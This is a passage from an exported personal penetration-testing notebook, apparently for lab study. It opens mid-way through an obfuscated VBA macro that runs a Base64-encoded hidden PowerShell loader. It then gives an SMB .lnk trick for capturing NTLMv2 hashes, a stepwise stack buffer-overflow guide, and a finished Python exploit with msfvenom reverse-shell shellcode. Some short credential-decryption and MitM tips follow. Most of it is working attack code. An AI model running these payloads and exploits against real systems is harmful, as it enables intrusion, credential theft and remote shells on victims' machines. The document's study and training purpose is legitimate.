&quot;wB7ADIAfQBqAFQAaABlADUARgB4AEsAWgBWAFgANgBwAFkAbwB&quot;</p><p>    Str = Str + &quot;EADcANwBkAEwAcgBNAGcAbQBjAFUASQBXAE0AWQAvAG4AQgBpA&quot;</p><p>    Str = Str + &quot;FEANABMACsAWAA2AFEAWQBRADgAZgBBAHYAVwBWAHQAagBFAGY&quot;</p><p>    Str = Str + &quot;ATQBiAGMAUwBJAGEAcgBIAEMAOABUAFkAaAA2AEgAZwBiAGkAV&quot;</p><p>    Str = Str + &quot;ABNAEgASQBRAFUAVwBUADQANwBJAFQATQAwAFYAdwAzAHgARgB&quot;</p><p>    Str = Str + &quot;FAGsAWgA2ACcAJwArACcAJwBXAHgATQBEACsAZQBUAFAANQBTA&quot;</p><p>    Str = Str + &quot;HgAcwBuAFoAdgBUAGoAZwBaAEkARgAnACcAKwAnACcAegBSAHM&quot;</p><p>    Str = Str + &quot;AQgB4AHkASgBZAFcARABsAGYARQB3AFYARwB1AGkAUQBLAFgAN&quot;</p><p>    Str = Str + &quot;ABoADcAMgBKAHEAQgBsADgAWgBBAEUALwBrAFIAVgBRAFcAegB&quot;</p><p>    Str = Str + &quot;GADUAbABqAEoAQgBEAEcAbABXAGUAbQAvAG0ARgBGAHUAOABUA&quot;</p><p>    Str = Str + &quot;HAARgA3AHIAewAyAH0ASwB5AHEAawBTAFMASABWADQAcQBHAFk&quot;</p><p>    Str = Str + &quot;AaABtAEMAOQB1AGEAVABJADMAcAB2AGkAZwBKADcALwBpAEoAb&quot;</p><p>    Str = Str + &quot;wBSAGYAaABYAEcAZwBBAEEARAAzAFMAMgBEAG4AcABaAHgAeAA&quot;</p><p>    Str = Str + &quot;rAGUARABTAGYANABVADAAeAA0AFYAMABqAFAAYwA3AEcATgB4A&quot;</p><p>    Str = Str + &quot;FYAewAxAH0AJwAnACsAJwAnAGkAdwBpAGUAKwAyAHYARQBsAEQ&quot;</p><p>    Str = Str + &quot;ATABoAEsATQBSAFoAKwBFAFcAcABwAG4ANwBNAE0AYgBxADUAQ&quot;</p><p>    Str = Str + &quot;QBsAHMASwBjAE0AMwBaAHYAYQA5AHgAbwBxAHAASgB1AGcARgB&quot;</p><p>    Str = Str + &quot;uAFUAdABZAEcAZAB1AE0AdQBKAHsAMQB9AGoALwByAFAAQQBaA&quot;</p><p>    Str = Str + &quot;DcAeQBtAEUASABtAGIAeABGAFgAcwBrAFEAQgBYAHQAdwBGAGE&quot;</p><p>    Str = Str + &quot;ARQBDAGYAbABxACcAJwArACcAJwBmAEoAYQBOAEwAQgBIADgAU&quot;</p><p>    Str = Str + &quot;gA2AFEAWABDAHAAMgBDACsANABwAGMAcgBLAEIAMwBTAHEAbQA&quot;</p><p>    Str = Str + &quot;yAEUAZABjAEkAQwB4AEkAOABVAEsAdAB0AGkARAA4ACcAJwArA&quot;</p><p>    Str = Str + &quot;CcAJwBTAFYAZQBQAEMAWABWAHgAcQBEAGsAUQAwAFEAaQA4AGc&quot;</p><p>    Str = Str + &quot;AbQBDAHIAegA1ADAANQBCAEUAMgBSAGoAYwBEAEUAQwA0AEQAd&quot;</p><p>    Str = Str + &quot;QBNAEEAZQBXAFoAagB6AEkARABwAHgASwBKAHgAbQB4AFQAVQA&quot;</p><p>    Str = Str + &quot;4AFgAYwB4AEMAUwBLAHgAUgBGAFUAVgBiAHEAeABKAEMAZQBUA&quot;</p><p>    Str = Str + &quot;GwAYQB5AE0ASwBMAFkAegBVAHAAYQBFAEoARgBrAFMANABzADU&quot;</p><p>    Str = Str + &quot;AMgAzAC8ASwBSADMAZgBOAG0ASABMAGkAbwBJAGkAbgA1AGkAY&quot;</p><p>    Str = Str + &quot;gAnACcAKwAnACcAcQBNAHoAQwBUAFEAeQBzAHMAaQBIAGcAWQB&quot;</p><p>    Str = Str + &quot;7ADEAfQB4AEIAUwBBAHsAMQB9AEQAZQBXAG0ASwBIAEkAQwByA&quot;</p><p>    Str = Str + &quot;HcAeQBFAHAATgA0AG0ASgA5AGEAeABFAC8AUABWAHgAKwBGAFk&quot;</p><p>    Str = Str + &quot;AMABLAG8AaABTAHkAQgBpAHkAdABJAEIAcQB3AEkAbABDAHcAd&quot;</p><p>    Str = Str + &quot;QBDAEIASwBDAEgANABLAFUAcQBnADUAQwAzAE4AagBzAGEAUgA&quot;</p><p>    Str = Str + &quot;0AEEAUwBMADcAVwBsAEcAbgB5AEkAZgBLAGsASwBUAEcAbgBsA&quot;</p><p>    Str = Str + &quot;GoASQB4ADYANwA4AHEAcABkAHAAQgBoAHoAbwBMAGsAQgBKADA&quot;</p><p>    Str = Str + &quot;AVABqAHgARQBTAEoAdABVAGMAYQB6AGsAawB7ADIAfQBDAEQAb&quot;</p><p>    Str = Str + &quot;gBWAEgAQQBBAHoARQArAGoAOABlAHYASwB3ADMANABFAG8AbAB&quot;</p><p>    Str = Str + &quot;4AEUAbABVAGwARABTAHoAeAB2AHEAVwBDACsAWgBuADUAawBHA&quot;</p><p>    Str = Str + &quot;HAASwB1AGkAWgBvAEwAUABIAEkAdQBTAEEAUQB6AHsAMgB9AGs&quot;</p><p>    Str = Str + &quot;AQwB4AHsAMgB9AEYAKwBFAHYANQBVAEYAdQBVAFQAJwAnACsAJ&quot;</p><p>    Str = Str + &quot;wAnAC8AawA3AFUAdABGAGcARABJADIAQQBtAG8ANAArAEoAMAB&quot;</p><p>    Str = Str + &quot;WAHQAVABZAHEARwBDAGIAOAArAHsAMQB9AFQAZABZADkAYwBLA&quot;</p><p>    Str = Str + &quot;DkAYQBUADAAMgA4ADIARgB7ADIAfQBNAC8ATQAwAEkAegBMAE0&quot;</p><p>    Str = Str + &quot;AWgBxAGYAYQBiAFQAYgBMAHEANQBaAGwAbAA3AGwAVgBNAC8AJ&quot;</p><p>    Str = Str + &quot;wAnACsAJwAnAGgATgB4ACsAQgBtACcAJwArACcAJwA3AGUASAB&quot;</p><p>    Str = Str + &quot;4ADAAZABLAGEAdgBmADYAUQBqAHcAeQB0AGUAVQA4AEsAOAAyA&quot;</p><p>    Str = Str + &quot;EYANQB0ADIAeQBSAG4AZABYAFcAMwB7ADEAfQBFAG0ALwAyAFc&quot;</p><p>    Str = Str + &quot;AbgA3ADkAWQBGAGYAYgBOADcAOQBGAHsAMgB9AHYAVwBQAFUAO&quot;</p><p>    Str = Str + &quot;AAvADgASwB6AGUAcwBYAFAAZABkAEkAZQBWAEwAcAA2AG8AWQB&quot;</p><p>    Str = Str + &quot;UAGEAewAyAH0AVgByAGMASAB1AGgAcgB2AFYAQwB7ADEAfQBhA&quot;</p><p>    Str = Str + &quot;G0AVABkADcASgBKACsAZAA5ADYAcQA4ACsAbgBRAHAAcQBqAHY&quot;</p><p>    Str = Str + &quot;ANQBmADIASAA0AGgAVQBpAG0AMwBiADQAYQBCAGUAWgB1AFQAT&quot;</p><p>    Str = Str + &quot;QAwAHIAVABFADcAZAAzAFkAdAB6ADIANwBNAFQASABjADcAYgB&quot;</p><p>    Str = Str + &quot;7ADEAfQBhAHYAQgB1AFcANQBWAHQAewAxAH0AMABTAGwAQwB6A&quot;</p><p>    Str = Str + &quot;DYAegBxADcARwBlAHEAaAB7ADIAfQBzAG4AYgAvAGIAcgBlADc&quot;</p><p>    Str = Str + &quot;AZABmADAAYgBoAGYAVwB2AHYAaAA1AHIAdwB4AHIAdABNAFQAc&quot;</p><p>    Str = Str + &quot;QB5AEsAdwB3ADkAOQBKAG0AbQBxAC8AcABjAFQAbABZAG8ASgB&quot;</p><p>    Str = Str + &quot;rACsAcwBFAHQAawB0AEgAegBvAHoAYwBCAFcASABWAHcAdwA4A&quot;</p><p>    Str = Str + &quot;DQAVwB5ADQAZQBJAE4AdQAyAHcAUABpAEwAMwBLADIANgBoAHg&quot;</p><p>    Str = Str + &quot;AeQAwAGQAYQBwAFYAVQB1AHUAZwAvADIAcgBsAGwAQwBzADkAY&quot;</p><p>    Str = Str + &quot;gBJAGoAdAB0AFgAbwA4AGkAdAB0AGEAcAByAFgAUgBzAFcAYQB&quot;</p><p>    Str = Str + &quot;5ADIAOQAyAHQAQgBxAHYAWAA2AC8AUABoAHIAWQA4ADkASABnA&quot;</p><p>    Str = Str + &quot;G4AbwA0AEcALwBlAEsASQBZAFcAJwAnACsAJwAnAGUAZABuADQ&quot;</p><p>    Str = Str + &quot;ARQBOAGcAdgBVADcAZQB6ADcATgBtAHcAMwBmAG0ARwAyAEsAU&quot;</p><p>    Str = Str + &quot;ABwAHgAewAyAH0AcwBiAGUALwBJAEEAcwA2AEwAYgBuADUAcQA&quot;</p><p>    Str = Str + &quot;vADYAbABIAHEAeAB2AC8ATQA3AEsAZAA3AHUARABpADkANwBtA&quot;</p><p>    Str = Str + &quot;GQAagBzAHQATQBhADIAZgB6ADkAdQBmAEkATgBqAGoAUABnAG4&quot;</p><p>    Str = Str + &quot;ANABlAFcAbQBTADQAUwBOAFIAQgBqADkAKwB5AHsAMQB9AHcAK&quot;</p><p>    Str = Str + &quot;wB0ADAAdgByAGsANABpAC8AVgBlAEoATgBGAEUAWQB6AFIASQB&quot;</p><p>    Str = Str + &quot;FAEoAVQBMADMAVABWAEsAeQB6AHMASgA3AFUANQBBADQAagBRA&quot;</p><p>    Str = Str + &quot;GsATgAnACcAKwAnACcAUgA5AHYAewAyAH0AOABqAHMATQBBAFU&quot;</p><p>    Str = Str + &quot;AJwAnACsAJwAnACsAaQBEADAAQwBsAFQARwBtAHUAVQBNAGsAZ&quot;</p><p>    Str = Str + &quot;AAwAGcAMABQAHsAMgB9AGgAbABaADAAYQBCAEMAaQBYAC8AVwB&quot;</p><p>    Str = Str + &quot;OAHYAVgB1AHYAZgBhAG4AUwBrADYAQgA2AGIAQgBUAHAAMAB2A&quot;</p><p>    Str = Str + &quot;FgAJwAnACsAJwAnAHsAMgB9AEMATgB5AEUAewAyAH0AQgBEAEU&quot;</p><p>    Str = Str + &quot;AegBiAFYAeAA0AFAATgBaAHQAcgBBADUATAB4AFMAZwB4AGgAY&quot;</p><p>    Str = Str + &quot;wAyAGgAZgBJACcAJwArACcAJwArAEMAZAA1AC8AdQBRAHAAYgB&quot;</p><p>    Str = Str + &quot;iAHAAVwA5AHMAYQB6AG8ARQBnAGQANABVAHYATgAwAGIAeAA0A&quot;</p><p>    Str = Str + &quot;HMARQBrADkAUwBsAEQAKwBQAEcARAB3AEYAewAxAH0ATgBTAG0&quot;</p><p>    Str = Str + &quot;AMwAyAEQAMgBGAG4AeAB3ACsAQgB6AEsAQwBSAFMAMwBRADUAb&quot;</p><p>    Str = Str + &quot;wBMAEUASABYAEcANgBDAG0ARQA2AGQAMgBlAHsAMQB9AEgARQB&quot;</p><p>    Str = Str + &quot;LAEkAVwBCAFgAaABQAHUAUAB4AFUATQBBAHkAQQBJAEcAegB2A&quot;</p><p>    Str = Str + &quot;EIAMwBLAEUAQwBpAFUAWgA0ADIAMwBnAHkAewAyAH0AZQBwAFU&quot;</p><p>    Str = Str + &quot;ALwBTADUAKwBrAFgATQAzAGcAegAvAHsAMgB9AFgAKwBoAHoAW&quot;</p><p>    Str = Str + &quot;ABmAHIAUAA3AEwAawBvAFYAcwBnAGwAQQBMADkAYQBmAEwANQB&quot;</p><p>    Str = Str + &quot;6AFUAKwBUADgASQB3AGcAQQBSAEQAcABJAFcAVgBGADYASwBEA&quot;</p><p>    Str = Str + &quot;DgAKwBBAE4ANwBCAEkAcwB1AFkAawB6AGkASgBFAGsAQgBOAGU&quot;</p><p>    Str = Str + &quot;ATQBzAFMAegArAEMANwBtAFoANwBmAHcAewAyACcAJwArACcAJ&quot;</p><p>    Str = Str + &quot;wB9AE4AcQBYAC8AMwA4AEEAVwBZACsAOQBBADQAcwBMAEEAQQB&quot;</p><p>    Str = Str + &quot;BAHsAMAB9ACcAJwApAC0AZgAnACcAPQAnACcALAAnACcATwAnA&quot;</p><p>    Str = Str + &quot;CcALAAnACcAMQAnACcAKQApACkAKQAsAFsAUwB5AHMAdABlAG0&quot;</p><p>    Str = Str + &quot;ALgBJAE8ALgBDAG8AbQBwAHIAZQBzAHMAaQBvAG4ALgBDAG8Ab&quot;</p><p>    Str = Str + &quot;QBwAHIAZQBzAHMAaQBvAG4ATQBvAGQAZQBdADoAOgBEAGUAYwB&quot;</p><p>    Str = Str + &quot;vAG0AcAByAGUAcwBzACkAKQApAC4AUgBlAGEAZABUAG8ARQBuA&quot;</p><p>    Str = Str + &quot;GQAKAApACkAKQAnADsAJABzAC4AVQBzAGUAUwBoAGUAbABsAEU&quot;</p><p>    Str = Str + &quot;AeABlAGMAdQB0AGUAPQAkAGYAYQBsAHMAZQA7ACQAcwAuAFIAZ&quot;</p><p>    Str = Str + &quot;QBkAGkAcgBlAGMAdABTAHQAYQBuAGQAYQByAGQATwB1AHQAcAB&quot;</p><p>    Str = Str + &quot;1AHQAPQAkAHQAcgB1AGUAOwAkAHMALgBXAGkAbgBkAG8AdwBTA&quot;</p><p>    Str = Str + &quot;HQAeQBsAGUAPQAnAEgAaQBkAGQAZQBuACcAOwAkAHMALgBDAHI&quot;</p><p>    Str = Str + &quot;AZQBhAHQAZQBOAG8AVwBpAG4AZABvAHcAPQAkAHQAcgB1AGUAO&quot;</p><p>    Str = Str + &quot;wAkAHAAPQBbAFMAeQBzAHQAZQBtAC4ARABpAGEAZwBuAG8AcwB&quot;</p><p>    Str = Str + &quot;0AGkAYwBzAC4AUAByAG8AYwBlAHMAcwBdADoAOgBTAHQAYQByA&quot;</p><p>    Str = Str + &quot;HQAKAAkAHMAKQA7AA==&quot;</p><p> </p><p> </p><p> CreateObject(&quot;Wscript.Shell&quot;).Run Str</p><p>End Sub</p></div><div class='page'><a name="Methdology--Client_Side_Attacks--smb_mslink_file_355.html"></a><h1 class='title level-3'>smb mslink file</h1><br/><p><span style="text-decoration:underline;">You need access to a target user smbshare, and for them to look or click the malicous file. </span></p><p><span style="text-decoration:underline;">This attack will give you a netntlmv2 hash if the user (or anyone looking at the file within the folder will trigger the event)</span></p><p></p><p>wget <a href="https://www.mamachine.org/mslink/mslink_v1.3.sh">https://www.mamachine.org/mslink/mslink_v1.3.sh</a></p><p></p><p><span style="color:#3f4043;">Creating the malicous link file. (The ip you wanna be using here is your own)</span></p><p>./mslink_v1.3.sh -l whatever -n hook -i \\\\10.13.31.108\\share -o hook.lnk</p><p></p><p><span style="color:#3f4043;">Then host your smbserver and make sure to have the .lnk file in same folder:</span></p><p>impacket-smbserver share ./ -smb2support</p><p></p><p><span style="color:#3f4043;">Now connect to the users remote share and place malicous .lnk file:</span></p><p>smbclient \\\\10.10.20.141\\Files -U myrtleowe</p><p>put hook.lnk</p><p></p><p><span style="color:#3f4043;">Wait for the event to trigger (for target user to open file or have folder open with file in it):</span></p><p><img src="images/355-1.png" alt="images/355-1.png" /></p><p></p><p><span style="color:#3f4043;">(you can do with responder instead of smbserver too)</span></p><p><img src="images/355-2.png" alt="images/355-2.png" /></p><p></p><p><span style="color:#3f4043;">And bam, it triggeres. Next up is trying to crack this netntlmv2 hash:</span></p><p><img src="images/355-3.png" alt="images/355-3.png" /></p><p></p><p><span style="color:#3f4043;">Awesmome, now we can move leterally to MichelleWat!</span></p><p></p></div><div class='page'><a name="Methdology--Client_Side_Attacks--Warshipping_390.html"></a><h1 class='title level-3'>Warshipping</h1><br/></div><div class='page'><a name="Methdology--Client_Side_Attacks--Warshipping--Warshipping_Rogue_AP_391.html"></a><h1 class='title level-4'>Warshipping Rogue AP</h1><br/><p><span style="color:#3f4043;">Warshipping:</span></p><p></p><p><a href="https://www.youtube.com/watch?v=GbkMA_VKbu0">https://www.youtube.com/watch?v=GbkMA_VKbu0</a></p></div><div class='page'><a name="Methdology--Buffer_Overflow_332.html"></a><h1 class='title level-2'>Buffer Overflow</h1><br/></div><div class='page'><a name="Methdology--Buffer_Overflow--Stack_Based_Overflow_333.html"></a><h1 class='title level-3'>Stack Based Overflow</h1><br/></div><div class='page'><a name="Methdology--Buffer_Overflow--Stack_Based_Overflow--spike_350.html"></a><h1 class='title level-4'>spike</h1><br/><p>gedit spike.spk</p><p><img src="images/350-1.png" alt="images/350-1.png" /></p><p></p><p><span style="color:#3f4043;">Syntax</span>:</p><p>generic_send_tcp 10.90.22.41 spike.spk 0 0 </p><p></p><p><span style="color:#3f4043;">Next, pay attention to the EAX register in immunity debugger to find the command we wish to use to then fuzz the application and figure out what amounts of bytes it takes before it crashes.</span></p></div><div class='page'><a name="Methdology--Buffer_Overflow--Stack_Based_Overflow--fuzz_334.html"></a><h1 class='title level-4'>fuzz</h1><br/><p><span style="color:#3f4043;">set mona:</span></p><p>!mona config -set workingfolder c:\mona\%p</p><p></p><p><span style="color:#3f4043;">Add the ip, port, prefix, and then see where it crashes/hangs (remember space)</span></p><p></p><p><img src="images/334-1.png" alt="images/334-1.png" /></p><p></p><p></p><p><img src="images/334-2.png" alt="images/334-2.png" /></p><p><span style="color:#3f4043;">Here we get a great starting point of where the application breaks due to our fuzzing, excellent ;)</span></p></div><div class='page'><a name="Methdology--Buffer_Overflow--Stack_Based_Overflow--finding_offset_335.html"></a><h1 class='title level-4'>finding offset</h1><br/><p><span style="color:#3f4043;">Adding about 300-400 bytes from where the application broke:</span></p><p></p><p><span style="color:#3f4043;">Copy this output into offset.py:</span></p><p>/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2400</p><p></p><p><span style="color:#3f4043;">Paste pattern into the offset.py script, and remember all the other values needed:</span></p><p><img src="images/335-1.png" alt="images/335-1.png" /></p><p></p><p><span style="color:#3f4043;">Restart the application in immunity debugger again, and then recrash the software running this script with new pattern</span></p><p></p><p><span style="color:#3f4043;">Now go into immunity debugger and copy the new EIP value and do this: </span></p><p>/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 2400 -q 6F43396E</p><p><img src="images/335-2.png" alt="images/335-2.png" /></p><p></p><p><span style="color:#3f4043;">And we get our exact offset, excellent ;)</span><span style="color:#3f4043;"></span></p><p><span style="color:#3f4043;"> </span></p><p><span style="color:#3f4043;">Place the offset value into badchars.py and exploit.py so you don&#39;t forget. </span></p></div><div class='page'><a name="Methdology--Buffer_Overflow--Stack_Based_Overflow--finding_bad_characters_336.html"></a><h1 class='title level-4'>finding bad characters</h1><br/><p><img src="images/336-1.png" alt="images/336-1.png" /></p><p>So we now our offset is 1978</p><p></p><p></p><p><span style="color:#3f4043;">Set monas bytearray to something we know is bad char:</span></p><p>!mona bytearray -b &quot;\x00&quot;</p><p></p><p><span style="color:#3f4043;">Then create initial list of bad chars. Start off like this in create.py:</span></p><p><img src="images/336-2.png" alt="images/336-2.png" /></p><p><span style="color:#3f4043;">Run create.py, and take output into the badchars.py</span></p><p></p><p><span style="color:#3f4043;">Then send badchars.py and the program will crash again.</span></p><p></p><p></p><p></p><p><span style="color:#3f4043;">Then compare the badchars.py request and the monas bytearrow and look for bad chars:</span></p><p>!mona compare -f C:\mona\oscp\bytearray.bin -a esp</p><p><img src="images/336-3.png" alt="images/336-3.png" /></p><p><span style="color:#3f4043;">Likely badchars from this output is: </span>00 07 2e a0</p><p><span style="color:#3f4043;">(Little trick: Usually the first and second ones are actually bad characters. Then next one gets corrupted. So 2e is likely a bad charaters, whilst 2f got corrupted. a0 is likely bad characters, whilst a1 got corrupted etc..)</span></p><p></p><p><span style="color:#3f4043;">Next, update create.py with our newly found bad characters, like so:</span></p><p><img src="images/336-4.png" alt="images/336-4.png" /></p><p></p><p><span style="color:#3f4043;">Then we take the new bytearray which doesn&#39;t contain the bad characters we don&#39;t want. </span></p><p></p><p><span style="color:#3f4043;">Take this output into badchars.py and save.</span></p><p></p><p><span style="color:#3f4043;">Run this command to mona to share this newly found information as well, like so: </span></p><p>!mona bytearray -b &quot;\x00\x07\x2e\xa0&quot;</p><p></p><p><span style="color:#3f4043;">It&#39;s preferred to go one step at a time. So do: </span>!mona bytearray -b “\x00\x07”<span style="color:#3f4043;"> instead, and repeat one badchar at a time until mona tells its unmodified</span></p><p></p><p><span style="color:#3f4043;">After this, we restart program and rerun our updated badchars.py</span></p><p></p><p></p><p><span style="color:#3f4043;">Compare the two again, like so:</span></p><p>!mona compare -f C:\mona\oscp\bytearray.bin -a esp</p><p></p><p><span style="color:#3f4043;">Mona now returns with “Unmodified”, excellent! ;) We have now solved the bad character issue</span></p><p><img src="images/336-5.png" alt="images/336-5.png" /></p><p></p></div><div class='page'><a name="Methdology--Buffer_Overflow--Stack_Based_Overflow--jump_point_337.html"></a><h1 class='title level-4'>jump point</h1><br/><p><span style="color:#3f4043;">We now have control over the EIP, but we need an address that will jump to a new stack frame, and help us get to shellcode execution. </span></p><p></p><p><span style="color:#3f4043;">Fortunately, this is easy with mona. Simply use this command and insert the bad characters, like so:</span></p><p>!mona jmp -r esp -cpb &quot;\x00\x07\x2e\xa0&quot;</p><p></p><p><span style="color:#3f4043;">Run, and now go to the log data window to review analyze the feedback. </span></p><p></p><p><span style="color:#3f4043;">Double click on of the pointers, and copy first JMP ESP you see. </span></p><p></p><p><span style="color:#3f4043;">Adress of jump point we got:</span></p><p>625011AF</p><p></p></div><div class='page'><a name="Methdology--Buffer_Overflow--Stack_Based_Overflow--exploitation_338.html"></a><h1 class='title level-4'>exploitation</h1><br/><p><span style="color:#3f4043;">Now take this and feed it to exploit.py</span><span style="color:#3f4043;"></span></p><p><span style="color:#3f4043;">Remember the format it needs to be done in. 2 and 2 characters together but reverse order, and with “\x” in front (It&#39;s called little endian) So “625011AF” turns to &quot;\xAF\x11\x50\x62&quot;) </span></p><p><img src="images/338-1.png" alt="images/338-1.png" /></p><p></p><p><span style="color:#3f4043;">In exploit.py remember all the other values needed</span></p><p></p><p><span style="color:#3f4043;">Now it&#39;s time for our shellcode. We&#39;ll use: (msfvenom wants the bad characters)</span></p><p>msfvenom -p windows/shell_reverse_tcp LHOST=10.13.31.108 LPORT=443 EXITFUNC=thread -b &quot;\x00\x11\x40\x5f\x60\xb8\xee&quot; -f c</p><p></p><p><span style="color:#3f4043;">Also, eploit.py wants the jump address you fouind lasty with mona, so not bad characters. For example:</span></p><p>jmp = &quot;\xAF\x11\x50\x62&quot;</p><p></p><p><span style="color:#3f4043;">Restart the program, and run the exploit.</span></p><p></p><p></p><p></p></div><div class='page'><a name="Methdology--Buffer_Overflow--Stack_Based_Overflow--exploitation--final_exploit_code_339.html"></a><h1 class='title level-5'>final exploit code</h1><br/><p>#!/usr/bin/env python3</p><p></p><p>import socket</p><p></p><p></p><p>ip=&quot;10.10.69.228&quot;</p><p>port=1337</p><p></p><p>#msfvenom -p windows/shell_reverse_tcp LHOST=10.13.31.108 LPORT=53 EXITFUNC=thread -b &quot;\x00\x11\x40\x5f\x60\xb8\xee&quot; -f c</p><p></p><p>shellcode = (&quot;\xfc\xbb\x6d\xa7\x30\x7d\xeb\x0c\x5e\x56\x31\x1e\xad\x01\xc3&quot;</p><p>&quot;\x85\xc0\x75\xf7\xc3\xe8\xef\xff\xff\xff\x91\x4f\xb2\x7d\x69&quot;</p><p>&quot;\x90\xd3\xf4\x8c\xa1\xd3\x63\xc5\x92\xe3\xe0\x8b\x1e\x8f\xa5&quot;</p><p>&quot;\x3f\x94\xfd\x61\x30\x1d\x4b\x54\x7f\x9e\xe0\xa4\x1e\x1c\xfb&quot;</p><p>&quot;\xf8\xc0\x1d\x34\x0d\x01\x59\x29\xfc\x53\x32\x25\x53\x43\x37&quot;</p><p>&quot;\x73\x68\xe8\x0b\x95\xe8\x0d\xdb\x94\xd9\x80\x57\xcf\xf9\x23&quot;</p><p>&quot;\xbb\x7b\xb0\x3b\xd8\x46\x0a\xb0\x2a\x3c\x8d\x10\x63\xbd\x22&quot;</p><p>&quot;\x5d\x4b\x4c\x3a\x9a\x6c\xaf\x49\xd2\x8e\x52\x4a\x21\xec\x88&quot;</p><p>&quot;\xdf\xb1\x56\x5a\x47\x1d\x66\x8f\x1e\xd6\x64\x64\x54\xb0\x68&quot;</p><p>&quot;\x7b\xb9\xcb\x95\xf0\x3c\x1b\x1c\x42\x1b\xbf\x44\x10\x02\xe6&quot;</p><p>&quot;\x20\xf7\x3b\xf8\x8a\xa8\x99\x73\x26\xbc\x93\xde\x2f\x71\x9e&quot;</p><p>&quot;\xe0\xaf\x1d\xa9\x93\x9d\x82\x01\x3b\xae\x4b\x8c\xbc\xd1\x61&quot;</p><p>&quot;\x68\x52\x2c\x8a\x89\x7b\xeb\xde\xd9\x13\xda\x5e\xb2\xe3\xe3&quot;</p><p>&quot;\x8a\x15\xb3\x4b\x65\xd6\x63\x2c\xd5\xbe\x69\xa3\x0a\xde\x92&quot;</p><p>&quot;\x69\x23\x75\x69\xfa\x46\x87\x6e\x96\x3e\x95\x90\x66\x8a\x10&quot;</p><p>&quot;\x76\x0c\xe4\x74\x21\xb9\x9d\xdc\xb9\x58\x61\xcb\xc4\x5b\xe9&quot;</p><p>&quot;\xf8\x39\x15\x1a\x74\x29\xc2\xea\xc3\x13\x45\xf4\xf9\x3b\x09&quot;</p><p>&quot;\x67\x66\xbb\x44\x94\x31\xec\x01\x6a\x48\x78\xbc\xd5\xe2\x9e&quot;</p><p>&quot;\x3d\x83\xcd\x1a\x9a\x70\xd3\xa3\x6f\xcc\xf7\xb3\xa9\xcd\xb3&quot;</p><p>&quot;\xe7\x65\x98\x6d\x51\xc0\x72\xdc\x0b\x9a\x29\xb6\xdb\x5b\x02&quot;</p><p>&quot;\x09\x9d\x63\x4f\xff\x41\xd5\x26\x46\x7e\xda\xae\x4e\x07\x06&quot;</p><p>&quot;\x4f\xb0\xd2\x82\x6f\x53\xf6\xfe\x07\xca\x93\x42\x4a\xed\x4e&quot;</p><p>&quot;\x80\x73\x6e\x7a\x79\x80\x6e\x0f\x7c\xcc\x28\xfc\x0c\x5d\xdd&quot;</p><p>&quot;\x02\xa2\x5e\xf4\x02\x44\xa1\xf7&quot;)</p><p></p><p>Command = &quot;OVERFLOW3 &quot;</p><p>Offset = 1274*&quot;A&quot;</p><p>jmp = &quot;\x03\x12\x50\x62&quot; #62501203</p><p>nops = 16*&quot;\x90&quot;</p><p></p><p>string = Command + Offset + jmp + nops + shellcode</p><p></p><p></p><p>try:</p><p>	with socket.socket() as s:</p><p>		s.connect((ip,port))</p><p>		print(&quot;sending  exploit&quot;)</p><p>		s.send(bytes(string,&#39;latin-1&#39;))</p><p>	</p><p>except:</p><p>	print(&quot;failed to connect&quot;)</p></div><div class='page'><a name="Methdology--Buffer_Overflow--binary_exploitatoin_750.html"></a><h1 class='title level-3'>binary exploitatoin</h1><br/><p><a href="https://github.com/xct/ropstar">https://github.com/xct/ropstar</a></p></div><div class='page'><a name="Methdology--Mass_vulnerability_scanners_207.html"></a><h1 class='title level-2'>Mass vulnerability scanners</h1><br/></div><div class='page'><a name="Methdology--Mass_vulnerability_scanners--Nessus_208.html"></a><h1 class='title level-3'>Nessus</h1><br/></div><div class='page'><a name="Methdology--Mass_vulnerability_scanners--OpenVas_209.html"></a><h1 class='title level-3'>OpenVas</h1><br/><p><h2>Installation</h2></p><p></p><p>apt install docker.io</p><p>docker run -d -p 443:443 --name openvas mikesplain/openvas</p><p><span style="color:#7f7f7f;"></span></p><p><span style="color:#7f7f7f;"></span><span style="color:#3f4043;">admin</span><span style="color:#404040;"></span></p><p><span style="color:#404040;">admin</span></p><p></p><p></p><p><span style="color:#3f4043;">Basic docker usage:</span></p><p>docker kill 48b3148162a9 <span style="color:#3f4043;">(you can also just write “docker kill” and then tab for the options)</span></p><p></p></div><div class='page'><a name="Methdology--random_spam_might_come_handy_idk_193.html"></a><h1 class='title level-2'>random spam might come handy idk</h1><br/></div><div class='page'><a name="Methdology--random_spam_might_come_handy_idk--secure_string_194.html"></a><h1 class='title level-3'>secure string</h1><br/><p><span style="color:#234141;">dealing with windows secure string on xml file:</span></p><p>$cred = import-clixml .\xyan1d3.xml</p><p>$cred.getnetworkcredential().password</p><p></p><p><span style="color:#234141;">then it&#39;ll output the secured string in clear text</span></p><p></p></div><div class='page'><a name="Methdology--random_spam_might_come_handy_idk--ip_adress_obfuscation_195.html"></a><h1 class='title level-3'>ip adress obfuscation</h1><br/><p><a href="https://thedarksource.com/cuteit-ip-obfuscator/">https://thedarksource.com/cuteit-ip-obfuscator/</a></p><p></p><p></p><p><span style="color:#234141;">Does developers usually account for and sanitize all the different ways someone could write an ip address..?</span><span style="color:#234141;"></span></p><p><span style="color:#234141;"></span><span style="color:#234141;"></span></p><p><span style="color:#234141;">HAHAH FUCK NO.</span><span style="color:#234141;"></span></p><p><span style="color:#234141;"></span><span style="color:#234141;"></span></p><p><span style="color:#234141;">This could come quite handy, and is quite real, so keep it in mind.</span></p><p></p></div><div class='page'><a name="Methdology--random_spam_might_come_handy_idk--RDP_MitM_Internal_196.html"></a><h1 class='title level-3'>RDP MitM Internal</h1><br/><p><a href="https://github.com/SySS-Research/Seth.git">https://github.com/SySS-Research/Seth.git</a></p><p></p><p><a href="https://www.youtube.com/watch?v=7HEwb6a8qU8">https://www.youtube.com/watch?v=7HEwb6a8qU8</a></p></div><div class='page'><a name="Methdology--random_spam_might_come_handy_idk--exifdata_216.html"></a><h1 class='title level-3'>exifdata</h1><br/><p><span style="color:#3f4043;">Download image like this:</span></p><p>wget <a href="https://www.file.io/2342423432">https://www.file.io/2342423432</a></p><p></p><p><span style="color:#3f4043;">Then use exiftool to extract the exifdata:</span></p><p>exiftool image.jpeg</p><p></p><p></p><p><span style="color:#3f4043;">If you get gps coordinates:</span></p><p><span style="color:#3f4043;">This is the format used for gps coordinates lookup on</span> <a href="https://www.google.com/maps">https://www.google.com/maps</a></p><p>37°44&#39; 13.52&quot;N, 122°29&#39;30.06&quot;W</p><p></p><p></p></div><div class='page'><a name="Methdology--random_spam_might_come_handy_idk--find_223.html"></a><h1 